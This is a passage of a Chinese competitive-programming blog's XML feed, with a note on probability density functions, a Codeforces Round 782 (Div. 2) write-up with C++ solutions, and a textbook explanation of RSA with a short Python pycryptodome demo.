$f(x)$，使得对任意的 x，有 $F(x)=\int _{-∞}^{x}f(t)dt$，则称 X 为连续随机变量，称 $f(x)$ 为 X 的<strong>概率密度函数</strong>。常见的连续性随机变量分布有均匀分布，正态分布，指数分布。</p><p>概率密度函数的几何意义：随机变量的取值落在某个区域之内的概率为概率密度函数在这个区域上的积分。当概率密度函数存在的时候，累积分布函数是概率密度函数的积分，对概率密度函数作傅里叶变换可得特征函数。</p><p>在数学中，连续型随机变量的概率密度函数（在不至于混淆时可以简称为密度函数）是一个描述这个随机变量的输出值，在某个确定的取值点附近的可能性的函数。而随机变量的取值落在某个区域之内的概率则为概率密度函数在这个区域上的积分。当概率密度函数存在的时候，累积分布函数是概率密度函数的积分。</p><h4 id="连续型随机向量及其概率分布"><a href="#连续型随机向量及其概率分布" class="headerlink" title="连续型随机向量及其概率分布"></a>连续型随机向量及其概率分布</h4><p>待更新</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 数学 </category>
          
          <category> 概率论 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 782(Div.2)解析</title>
      <link href="/2022/04/18/Codeforces%20Round%20782(Div.2)/"/>
      <url>/2022/04/18/Codeforces%20Round%20782(Div.2)/</url>
      
        <content type="html"><![CDATA[<p>还是很开心的，第一次CF打出来D题，嘎嘎上132分，目前1584分，紫名指日可待。</p><span id="more"></span><h2 id="A-Red-Versus-Blue"><a href="#A-Red-Versus-Blue" class="headerlink" title="A.Red Versus Blue"></a>A.Red Versus Blue</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>知道双方赢球场次，要求构造一个输赢序列使得总比赛中最大连赢场数最小，即给定两种字符及个数，输出一个字符串使得由相同字符构成的子串最短。</p><p>首先题目给定了B的数目严格小于R，那么最优的情况一定是一输一赢，考虑在 b 个 B 中插入R，容易得到总共有 b+1 个可以插入的位置。若 r 可以整除 b+1，则可以得出答案为 r/(b+1)，若否，则得到 r/(b+1)+1。</p><p>我们先在b+1个位置中每个放上 r/(b+1) 个 R，剩下r%(b+1)个R则随便给，只要不要一个位置给两次就可以了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,r,b;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;r&gt;&gt;b;</span><br><span class="line">    <span class="keyword">int</span> k=r/(b+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> res=r%(b+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=b;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=k;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(res)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">            res--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=k;j++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(res)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;R&quot;</span>);</span><br><span class="line">        res--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Bit-Flipping"><a href="#B-Bit-Flipping" class="headerlink" title="B. Bit Flipping"></a>B. Bit Flipping</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定二进制字符串和k次的操作，要求输出最大字典序的字符串。一次操作会使任意一个位置的字符不变，其它的全部取反。那么容易得到一个结论：对任意一个位置操作偶数次不会该边整体字符串。</p><p>如果k为偶数，则未操作过的数（或者说操作次数为偶数）的数将不变，操作过的数（或者说操作次数为奇数）的数将取反。</p><p>如果k为奇数，则与偶数情况刚好相反。</p><p>我们考虑偶数情况，字符串高位开始，若碰到0则取反变成1，减少一次操作次数并记录在这个位置。若操作到所有序列为全1，则将剩余的操作全部甩给最后一位，使得最后的结果只存在 $111…1$ 和 $111…0$。如果为奇数的话，把0当成1，1当成0即可，我们最后输出的时候把0输出为1，1输出为0，操作按偶数方法操作并且尽量使得字符串结果为0。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1000005</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> p=k%<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;1&#x27;</span>&amp;&amp;k)&#123;</span><br><span class="line">                s[i]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                a[i]=<span class="number">1</span>;</span><br><span class="line">                k--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                a[i]=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;0&#x27;</span>&amp;&amp;k)&#123;</span><br><span class="line">                s[i]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">                a[i]=<span class="number">1</span>;</span><br><span class="line">                k--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                a[i]=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a[n<span class="number">-1</span>]+=k;</span><br><span class="line">    <span class="keyword">if</span>(k%<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p)&#123;</span><br><span class="line">            s[n<span class="number">-1</span>]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            s[n<span class="number">-1</span>]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p^(s[i]==<span class="string">&#x27;1&#x27;</span>))<span class="built_in">putchar</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">putchar</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;<span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定占领的国家的位置和占领花费系数以及迁都花费系数，求最少花费占领所有王国。</p><p>我们可以算迁都产生的花费和产生的收益进行比较，当收益&gt;=花费时我们选择迁都，否则选择直接攻打那些国家。</p><p>不难得到迁都产生的花费为 $b|x_i-pos|$，pos为当前首都的位置，得到的收益为：$a|x_i-pos|*(n-i)$，判断一下模拟就直接过。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1000005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,a,b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld %lld&quot;</span>,&amp;n,&amp;b,&amp;a);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    x[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> pos=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="comment">//attack</span></span><br><span class="line">        ans+=a*(x[i]-pos);</span><br><span class="line"><span class="comment">//        printf(&quot;attack %d %d %d\n&quot;,i,x[i],a);</span></span><br><span class="line"><span class="comment">//        printf(&quot;ans=%d\n&quot;,ans);</span></span><br><span class="line">        <span class="keyword">int</span> cost=(n-i)*a*(x[i]-pos);</span><br><span class="line">        <span class="keyword">if</span>(cost&gt;=b*(x[i]-pos))&#123;</span><br><span class="line">            ans+=b*(x[i]-pos);</span><br><span class="line">            pos=x[i];</span><br><span class="line"><span class="comment">//            printf(&quot;move in pos %d\n&quot;,i);</span></span><br><span class="line"><span class="comment">//            printf(&quot;ans=%d\n&quot;,ans);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Reverse-Sort-Sum"><a href="#D-Reverse-Sort-Sum" class="headerlink" title="D. Reverse Sort Sum"></a>D. Reverse Sort Sum</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你描述了一个序列 A 的值为 $\sum _{i=1}^{n}f(i,A)$，$f(i,A)$ 函数得到的序列就是将序列 A 的前 i 个数排序，数的取值只有0,1。现在给定最终的结果，让你逆向分析初始可能的0,1序列。</p><p>这个我写了个假算法，我自己也无法证明这个算法的正确性，但是他就是过了。。</p><p>首先分析序列后半部分，容易得到，若$a_i&lt;i$，那么 $x_i=0$，否则$x_i=1$，因为后半部分至少有一半的值是来自自己贡献的。拿最后一个举例，如果最后一个值为1或0，那么原序列最后一个值必是0。否则是最后一个值一定是 n，没有其它情况，可以很容易得到的。</p><p>对于前半部分的序列的值确定了第$i$个0的位置，当然后半部分我们都确定好了，如果超出则直接结束循环输出结果。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1000005</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">        a[i]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;n/<span class="number">2</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x[i]&lt;i)&#123;</span><br><span class="line">            a[i]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            a[i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!x[i])&#123;</span><br><span class="line">            a[i]=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="number">0</span>)x[i]+=i<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(x[i]==n)<span class="keyword">break</span>;</span><br><span class="line">        a[x[i]+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>D题可能有点问题，欢迎大家hack。</p><p>总之第一次Div2能做出四题，还是很开心的。</p><p>提交记录：</p><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/5.png" alt="5"></p><p><img src="/2022/04/18/Codeforces%20Round%20782(Div.2)/6.png" alt="6"></p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 思维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA加密原理解析</title>
      <link href="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
      <url>/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>今天来深度解析一下<code>RSA</code>加密</p><span id="more"></span><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>还是最朴素的例子，<code>Alice</code>和<code>Bob</code>要在不安全的路线上发送信息，整条线路完全被窃听者<code>Eve</code>所知，如何让<code>Alice</code>和<code>Bob</code>安全地通信呢？如果这个例子略难懂，那换一个来讲，我要给别人寄个快递，我怎样让别人不知道我寄的是什么，一般情况下，如果没什么特殊情况，快递是不会被随便拆开查看的，但是也很难说，如果我给我实际要送的东西上把锁，那么即使我送的快递被拆开，没有钥匙也不会有人知道我送的是啥，而钥匙只有收件人拥有。</p><p>这就是非对称加密的一个例子了，一个人只有锁，另一个人有钥匙，可以这么说，当把锁关上的那一刻，寄件人都没办法打开去检查他寄的是啥，如果这个锁足够强大的话。</p><h2 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h2><p>rsa主要是利用一系列的数学公式，让推导难以逆向分析，常见的有右移运算或者取模运算，RSA主要是使用取模运算。首先，我选择一个指数(e)，让明文(m)进行这么多次的幂运算，再模上一个数(N)，这也就得到了密文(c)，这个密文难以逆向得到明文，因为取模运算不可逆，这个e和N是公开的，所有人都可以加密，也就是锁，但是钥匙只有自己拥有。</p><p><img src="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/1.png" alt="1"></p><p>这里也先给出加密和解密的公式：</p><p><img src="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/2.png" alt="2"></p><p>在这里d由一个公式算得：d相当于e在模φ(n)意义下的逆元。也就是它们满足这个公式：</p><p>$e\times d \ \ \text{mod}\ \ φ(n)=1$</p><h2 id="RSA加密原理解析"><a href="#RSA加密原理解析" class="headerlink" title="RSA加密原理解析"></a>RSA加密原理解析</h2><p>为什么满足了这个关系就能通过上面的公式解密了呢？</p><p>通过e和d满足的关系我们可以得到这样的式子：</p><p>$e \times d=1+k*φ(n)$</p><p>k为任意整数。</p><p>$d=\frac{1+k*φ(n)}{e}$</p><p>这里还需要一个定理：欧拉定理</p><h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>这个算费马小定理的扩展吧，费马小定理的表达式如下：</p><p>对于任意整数a和任意质数p有以下式子成立：</p><p>$a^p$与$a$在$\ \text{mod}\ p$ 意义下同余，即$a^{p-1}\ \text{mod}\ p=1$</p><p>而对于任意质数，它的欧拉函数就是自己-1，欧拉函数的描述为</p><blockquote><p>欧拉函数 是小于或等于n的正整数中与n互质的数的数目</p></blockquote><p>而对于非质数，它一定可以写成若干个质数相乘，即</p><p>$n=p_1^{a_1}\times p_2^{a_2}\times p_3^{a_3}\times……\times p_n^{a_n}$</p><p>$a_i$为任意整数，$p_i$为任意质数，就是说，任何一个大于2的整数一定会有上式成立。</p><p>它的欧拉函数则是</p><p>$φ(n)=(p_1-1)p_1^{a_1-1}\times(p_2-1)p_2^{a_2-1}\times(p_3-1)p_3^{a_3-1}\times……\times(p_n-1)p_n^{a_n-1}$</p><p>那么欧拉定理的表达式是什么呢，那就是下面这个式子：</p><p>任意正整数a和p，有以下式子成立</p><p>$a^{φ(p)}\ \text{mod}\ p=1$</p><p>有了这个式子之后我们再代入上面那个式子，可以得到</p><p>$m^{e\times d}\ \text{mod}\  n=m^{1+kφ(n)}\ \text{mod}\ n$</p><p>这里需要用到一些简单的同余定理：</p><p>$a\times b\ \text{mod}\ n=((a\ \text{mod}\ n)\times (b\ \text{mod}\ n))\ \text{mod}\ n$</p><p>那么$m^{1+kφ(n)}\ \text{mod}\ n=m*(m^{φ(n)}\ \text{mod}\ n)^k\ \text{mod}\ n$</p><p>而括号里的表达式恒为1，最后结果就变成了$m$</p><p>可以发现，如果m不大于n，那么m的值应当是唯一的，而加密出现的中间产物$c$若没有$d$则永远无法推到得到$m$，这也就是<code>RSA</code>算法的核心了。</p><h2 id="RSA密钥生成"><a href="#RSA密钥生成" class="headerlink" title="RSA密钥生成"></a>RSA密钥生成</h2><p>讲完了原理之后我们来讲讲怎么生成RSA密钥，首先选取两个很大的质数p,q，这里得到n=p*q，那么容易得到n的欧拉函数$φ(n)=(p-1)\times (q-1)$</p><p>再任意选取一个质数e作为加密质数，也很容易算出解密指数$d=\text{inverse}(e,φ(n))$ ，inverse为求模逆元的函数。</p><p>$(e,n)$就是公钥，$(d,n)$就是私钥，这样我们的密钥就生成完毕了。</p><h2 id="python代码实现"><a href="#python代码实现" class="headerlink" title="python代码实现"></a>python代码实现</h2><p>这里用到一个<code>Crypto</code>库，安装方法为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure><p>demo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">m=<span class="number">123456</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">dec=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(dec)</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/3.png" 